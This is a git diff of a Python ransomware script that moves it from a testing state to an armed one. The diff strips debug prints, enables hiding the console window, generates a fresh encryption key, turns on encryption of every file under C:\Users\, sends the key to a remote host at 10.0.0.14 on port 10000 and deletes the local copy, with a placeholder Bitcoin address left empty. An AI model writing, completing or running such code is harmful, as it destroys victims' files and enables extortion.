@@ -31,7 +31,6 @@ def curr_user():
 def encrypt_all_dir(root_dir, key):
         for dirName, subDirList, fileList in os.walk(root_dir):
                 for file in fileList:
-                        print(os.path.join(root_dir, file))
                         try:
                                 o = open(os.path.join(root_dir, file), 'rb')
                         except PermissionError:
@@ -41,7 +40,6 @@ def encrypt_all_dir(root_dir, key):
                         o = open(os.path.join(root_dir, file), 'rb')
                         data = o.read()
                         o.close()
-                        print(file)
                         fernet = Fernet(key)
                         encrypted = fernet.encrypt(data)
 
@@ -97,29 +95,26 @@ def send_file(file_name, host, port):
 def main():
         btc_addr = ''
         #hide the console window
-        #"""
-        #kernel32 = ctypes.WinDLL('kernel32')
-        #user32 = ctypes.WinDLL('user32')
-        #SW_HIDE = 0
-        #window = kernel32.GetConsoleWindow()
-        #user32.ShowWindow(window, SW_HIDE)
-        #"""
-        #generate key then write a file named after the ip of the machine
-        # file saved as xx-xx-xxx-xx.key
-        #key = Fernet.generate_key()
-        key_name = "key" #os.popen('nslookup myip.opendns.com. resolver1.opendns.com').read()
 
-        f = open(key_name, "rb")
-        key = f.read()
+        kernel32 = ctypes.WinDLL('kernel32')
+        user32 = ctypes.WinDLL('user32')
+        SW_HIDE = 0
+        window = kernel32.GetConsoleWindow()
+        user32.ShowWindow(window, SW_HIDE)
+        
+        #generate key then write a file named after the ip of the machine
+        key = Fernet.generate_key()
+        key_name = "key.key"
+
+        f = open(key_name, "wb")
+        f.write(key)
         f.close()
         user = curr_user()
-        target_dir = 'C:\\Users\\' + 'utkar' #user
-        print(target_dir)
-        print(key)
-        #encrypt_all_dir(target_dir, key)
+        target_dir = 'C:\\Users\\'
+        encrypt_all_dir(target_dir, key)
         send_file(key_name, '10.0.0.14', 10000)
         #delete the key file
-        #os.remove(key_name)
+        os.remove(key_name)
 
 #class GUI:
 #        def __init__(self, master)
